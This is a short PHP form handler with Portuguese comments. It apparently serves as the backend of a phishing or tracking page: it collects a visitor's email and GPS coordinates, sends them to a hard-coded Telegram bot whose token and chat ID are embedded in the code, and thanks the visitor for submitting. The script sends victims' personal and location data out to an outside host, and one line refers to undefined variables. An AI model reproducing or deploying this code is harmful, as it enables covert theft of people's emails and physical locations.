<?php
// CONFIGURAÇÕES DO TELEGRAM
$token = '7359276298:AAFKWa0pEZU9WY0FwnkC-drQDNVQxQZXtLc';
$chat_id = '5379369411';

// --- DADOS DO FORMULÁRIO ---
$email = $_POST['email'] ?? 'não informado';
$lat = $_POST['lat'] ?? 'desconhecido';
$lng = $_POST['lng'] ?? 'desconhecido';

$mensagem = "Novo acesso com localização:\n\n";
$mensagem .= "Email: $email\n";
$mensagem .= "Latitude: $lat\n";
$mensagem .= "Longitude: $lng\n";

// Enviar pro Telegram
file_get_contents("https://api.telegram.org/bot7359276298:AAFKWa0pEZU9WY0FwnkC-drQDNVQxQZXtLc/sendMessage?chat_id=5379369411&text=" . urlencode($mensagem));

file_get_contents($url . "?" . http_build_query($data));

// --- REDIRECIONA OU EXIBE MENSAGEM ---
echo "<h3>Obrigado! Seus dados foram recebidos.</h3>";
?>
